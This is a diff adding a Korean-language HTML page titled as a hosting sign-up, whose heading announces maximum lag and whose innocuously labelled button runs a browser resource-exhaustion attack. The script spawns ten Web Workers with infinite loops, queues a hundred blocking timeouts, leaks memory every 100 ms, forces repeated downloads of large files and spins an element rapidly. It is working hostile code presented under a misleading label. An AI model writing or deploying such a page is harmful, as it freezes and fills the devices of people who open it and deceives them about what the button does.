@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ian호스팅 가입</title>
+    <style>
+        #box {
+            width: 100px;
+            height: 100px;
+            background-color: red;
+            position: absolute;
+        }
+    </style>
+</head>
+<body>
+    <h1>최대 렉 유발</h1>
+    <button onclick="startMaxLag()">소개 시작</button>
+
+    <div id="box"></div>
+
+    <script>
+        let workers = [];
+        let asyncTasks = [];
+        let diskIOInterval;
+        let renderInterval;
+        let memoryLeaks = [];
+
+        // 무한 루프 + Web Worker (CPU 과부하)
+        function startMaxLag() {
+            // Web Worker - 무한 루프
+            for (let i = 0; i < 10; i++) { // 스레드 수를 조절하여 CPU 사용량 증가
+                let workerBlob = new Blob([`
+                    while (true) {}
+                `], { type: 'application/javascript' });
+
+                let worker = new Worker(URL.createObjectURL(workerBlob));
+                workers.push(worker);
+            }
+
+            // 비동기 작업 - CPU 과부하
+            for (let i = 0; i < 100; i++) { // 많은 비동기 작업 추가
+                asyncTasks.push(setTimeout(function() {
+                    while (true) {} // 무한 루프
+                }, 0));
+            }
+
+            // 메모리 과부하
+            setInterval(function() {
+                let leak = new Array(1000000).join("A");  // 대용량 문자열
+                memoryLeaks.push(leak); // 메모리 누수
+            }, 100);
+
+            // 디스크 I/O 과부하
+            diskIOInterval = setInterval(function() {
+                let data = new Array(100000).join("A");
+                let blob = new Blob([data], { type: 'text/plain' });
+                let url = URL.createObjectURL(blob);
+
+                // 파일 다운로드 링크 생성
+                let link = document.createElement("a");
+                link.href = url;
+                link.download = 'large-file.txt';
+                link.click(); // 링크 클릭
+            }, 100);
+
+            // GPU 렌더링 과부하
+            let box = document.getElementById('box');
+            renderInterval = setInterval(function() {
+                let randomRotation = Math.random() * 360;
+                box.style.transform = `rotate(${randomRotation}deg)`;
+            }, 10); // 빠른 애니메이션 실행
+        }
+
+    </script>
+</body>
+</html>
